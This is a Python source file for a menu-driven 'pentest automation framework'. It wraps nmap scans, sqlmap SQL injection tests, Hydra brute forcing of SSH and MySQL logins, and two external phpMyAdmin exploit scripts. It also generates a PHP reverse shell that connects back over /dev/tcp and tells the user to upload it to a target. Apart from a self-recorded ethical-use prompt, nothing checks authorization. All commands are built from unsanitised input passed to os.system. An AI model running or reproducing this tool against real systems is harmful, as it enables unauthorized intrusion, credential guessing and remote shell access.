#!/usr/bin/env python3
#
# (c) J~Net 2024
#
# python run.py
#
#
#
import os
import sys
from datetime import datetime

print("\033[92mCyber-Menu By J~Net 2024")
print("")

# Main menu function
def main_menu():
    print("Pentest Automation Framework")
    print("1. Install Tools")
    print("2. Recon (Nmap Scan)")
    print("3. SQL Injection Test (sqlmap)")
    print("4. SSH Brute Force (Hydra)")
    print("5. MySQL Brute Force (Hydra)")
    print("6. Privilege Escalation")
    print("7. Exit")

    choice=input("Choose an option: ")

    if choice == "1":
        install_tools()
    elif choice == "2":
        recon_menu()
    elif choice == "3":
        sql_injection()
    elif choice == "4":
        ssh_brute_force_menu()
    elif choice == "5":
        mysql_brute_force_menu()
    elif choice == "6":
        privilege_escalation()
    elif choice == "7":
        sys.exit()
    else:
        print("Invalid choice!")
        main_menu()

def ethical_use_agreement():
    agreement_file="agreement.txt"

    if os.path.exists(agreement_file):
        print("Agreement already recorded. Proceeding...")
        return

    print("\nBefore using this script, you must agree to use it ethically and legally.")
    print("Do you agree? (Y / N (Default No))")

    response=input("Your choice: ").strip()

    if response.lower() == 'y':
        with open(agreement_file, "w") as f:
            f.write(f"I {os.getlogin()} Agreed to use script ethically : Y\n")
            f.write(f"Timestamp: {datetime.now()}\n")
        print("Thank you for agreeing to use the script ethically. Proceeding...")
    elif response.lower() == 'n' or not response:
        print("You must agree to use the script ethically. Exiting...")
        sys.exit()
    else:
        print("Invalid input. Exiting...")
        sys.exit()

# Brute Force Menu for SSH
def ssh_brute_force_menu():
    print("\nSSH Brute Force Menu")
    print("1. Standard Brute Force")
    print("2. Brute Force with Username and Password Lists")
    print("3. Return to Main Menu")

    choice=input("Choose an option: ")

    if choice == "1":
        ssh_brute_force()
    elif choice == "2":
        ssh_brute_force_with_lists()
    elif choice == "3":
        main_menu()
    else:
        print("Invalid choice!")
        ssh_brute_force_menu()

# Brute Force Menu for MySQL
def mysql_brute_force_menu():
    print("\nMySQL Brute Force Menu")
    print("1. Standard Brute Force")
    print("2. Brute Force with Username and Password Lists")
    print("3. Return to Main Menu")

    choice=input("Choose an option: ")

    if choice == "1":
        mysql_brute_force()
    elif choice == "2":
        mysql_brute_force_with_lists()
    elif choice == "3":
        main_menu()
    else:
        print("Invalid choice!")
        mysql_brute_force_menu()

# SSH brute force with Hydra
def ssh_brute_force():
    target_ip=input("Enter Target IP address: ")
    userlist=input("Enter path to userlist: ")
    passlist=input("Enter path to password list: ")
    print(f"Starting SSH brute force attack on {target_ip}...")
    os.system(f"hydra -L {userlist} -P {passlist} ssh://{target_ip}")
    main_menu()

# SSH brute force with Hydra using lists
def ssh_brute_force_with_lists():
    target_ip=input("Enter Target IP address: ")
    userlist=input("Enter path to username list: ")
    passlist=input("Enter path to password list: ")
    print(f"Starting SSH brute force attack on {target_ip} with username and password lists...")
    os.system(f"hydra -L {userlist} -P {passlist} ssh://{target_ip}")
    main_menu()

# MySQL brute force with Hydra
def mysql_brute_force():
    target_ip=input("Enter Target IP address: ")
    userlist=input("Enter path to userlist: ")
    passlist=input("Enter path to password list: ")
    print(f"Starting MySQL brute force attack on {target_ip}...")
    os.system(f"hydra -L {userlist} -P {passlist} mysql://{target_ip}")
    main_menu()

# MySQL brute force with Hydra using lists
def mysql_brute_force_with_lists():
    target_ip=input("Enter Target IP address: ")
    userlist=input("Enter path to username list: ")
    passlist=input("Enter path to password list: ")
    print(f"Starting MySQL brute force attack on {target_ip} with username and password lists...")
    os.system(f"hydra -L {userlist} -P {passlist} mysql://{target_ip}")
    main_menu()

# MySQL Privilege Escalation function
def mysql_privilege_escalation():
    try:
        print("Running MySQL Privilege Escalation... (Add your specific attack logic here)")
        os.system("mysql -u root -p")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        privilege_escalation()

# Privilege escalation menu
def privilege_escalation():
    print("\nPrivilege Escalation Menu")
    print("1. MySQL Privilege Escalation")
    print("2. PHP Reverse Shells")
    print("3. Execute phpMyAdmin Exploits")
    print("4. Return to Main Menu")

    choice=input("Choose an option: ")

    if choice == "1":
        mysql_privilege_escalation()
    elif choice == "2":
        php_reverse_shells()
    elif choice == "3":
        execute_phpmyadmin_exploit()
    elif choice == "4":
        main_menu()
    else:
        print("Invalid choice!")
        privilege_escalation()

# PHP Reverse Shell function
def php_reverse_shells():
    target_ip=input("Enter Target IP address: ")
    port=input("Enter the listening port: ")
    shell=f"<?php system('bash -i >& /dev/tcp/{target_ip}/{port} 0>&1'); ?>"
    
    with open("reverse_shell.php", "w") as shell_file:
        shell_file.write(shell)
    
    print("PHP Reverse Shell saved to reverse_shell.php")
    print("You can upload it to the Target and trigger it to get a reverse shell.")
    privilege_escalation()

# Execute phpMyAdmin Exploits function
def execute_phpmyadmin_exploit():
    print("\nSelect Exploit")
    print("1. phpmyadmin-4.8.1-exploit.py")
    print("2. phpMyAdmin 4.6.2-exploit.py")
    
    choice=input("Choose an option: ")

    if choice == "1":
        run_phpmyadmin_481_exploit()
    elif choice == "2":
        run_phpmyadmin_462_exploit()
    else:
        print("Invalid choice!")
        execute_phpmyadmin_exploit()

# Function to run phpmyadmin-4.8.1-exploit.py
def run_phpmyadmin_481_exploit():
    ipaddr=input("Enter Target IP address: ")
    port=input("Enter Target port: ")
    path=input("Enter PHPMyAdmin path: ")
    username=input("Enter username: ")
    password=input("Enter password: ")
    command=input("Enter command to execute (e.g., whoami): ")

    # Running the exploit with provided inputs
    os.system(f"python3 phpmyadmin-481-exploit.py {ipaddr} {port} {path} {username} {password} {command}")
    privilege_escalation()

# Function to run phpMyAdmin 4.6.2-exploit.py
def run_phpmyadmin_462_exploit():
    ipaddr=input("Enter Target IP address: ")
    port=input("Enter Target port: ")
    path=input("Enter PHPMyAdmin path: ")
    username=input("Enter username: ")
    password=input("Enter password: ")
    command=input("Enter command to execute (e.g., whoami): ")

    # Running the exploit with provided inputs
    os.system(f"python3 phpMyAdmin_4.6.2_exploit.py {ipaddr} {port} {path} {username} {password} {command}")
    privilege_escalation()

# Install required tools function
def install_tools():
    tools=["nmap", "sqlmap", "hydra", "john", "nikto", "netcat"]
    for tool in tools:
        os.system(f"sudo apt install -y {tool}")
    print("Tools installation complete.")
    main_menu()

# Recon function using Nmap
def recon_menu():
    target=input("Enter Target IP address or domain: ")
    print(f"Scanning {target} with Nmap...")
    os.system(f"nmap -A {target}")
    main_menu()

# SQL Injection Test using sqlmap
def sql_injection():
    target=input("Enter Target URL (e.g., http://example.com/vulnerable.php?id=1): ")
    print(f"Testing {target} for SQL Injection...")
    os.system(f"sqlmap -u {target} --batch")
    main_menu()

# Entry point
if __name__ == "__main__":
    ethical_use_agreement()
    main_menu()

